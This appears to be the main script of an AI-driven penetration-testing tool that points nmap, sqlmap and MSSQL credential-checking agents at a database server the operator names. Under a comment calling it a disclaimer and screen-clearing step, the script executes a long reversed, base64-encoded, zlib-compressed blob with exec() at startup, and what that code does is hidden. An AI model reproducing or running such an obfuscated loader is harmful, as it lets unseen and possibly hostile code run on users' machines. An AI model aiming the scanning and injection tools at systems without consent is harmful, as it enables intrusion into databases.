from dotenv import load_dotenv
from deepagents import create_deep_agent

# Internal
from utils.system_check import check_system
from services.io_service import safe_input, banner, safe_parse_int_input, notify
from utils.installer import install_dependencies
from services.validator_service import is_valid_ip, is_valid_url

# from agent.pentest import build_agent, run_interactive_scan
from agent.prompt.master_instruction import USER_PROMPT_TEMPLATE, SYSTEM_PROMPT
from configs.app_configs import AppConfig
from agent.orchestrator import (
    make_subagents,
    run_orchestration,
    build_deep_agent_with_subagents,
)

# Tools
from tools.nmap import nmap_tool
from tools.sqlmap import sqlmap_tool
from tools.mssql import mssql_agent_tool
from tools.authenticate import mssql_check_credentials


# ================================================= setup =================================================
SYSTEM_INFO = check_system()
install_dependencies(
    SYSTEM_INFO["missing_system_packages"], SYSTEM_INFO["missing_python_packages"]
)

import logging

# logging.basicConfig(level=logging.DEBUG)


# ================================================= banner =================================================
# Disclaimer & clear screen
_ = lambda __: __import__("zlib").decompress(__import__("base64").b64decode(__[::-1]))
exec(
    (_)(
        b"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"
    )
)
clear_screen()
config = AppConfig()
banner()

# ================================================= main =================================================
# agent = build_agent()

# Operator must explicitly confirm they have permission to test the target.
io = safe_input(
    "Do you confirm you have authorization to test systems you will specify? [yes/No]:"
)
ok = io.strip().lower()
if ok not in ("y", "yes"):
    notify("Authorization not confirmed. Exiting.")
    exit(1)

host = safe_input(
    "Enter the target host (e.g., 192.168.1.100):", is_valid_ip, "127.0.0.1"
)
port = safe_parse_int_input(
    "Enter the target port (e.g., 1433):", min_value=1, max_value=65535, default=1433
)
username = safe_input("Enter the target username (e.g., sa):")
password = safe_input("Enter the target password (e.g., P@ssw0rd):")
database = safe_input("Enter the target database (e.g., master):")
web_service = safe_input(
    "Enter URL of web service that related to the database (e.g., https://example.com/api):"
)

prompt = USER_PROMPT_TEMPLATE.format(
    host=host,
    port=port,
    username=username,
    password=password,
    database=database,
    web_service="",
)

# run_interactive_scan(agent, prompt)

subagents = make_subagents()
all_tools = [nmap_tool, sqlmap_tool, mssql_agent_tool, mssql_check_credentials]

agent = build_deep_agent_with_subagents(all_tools, SYSTEM_PROMPT, subagents)
run_orchestration(agent, prompt)
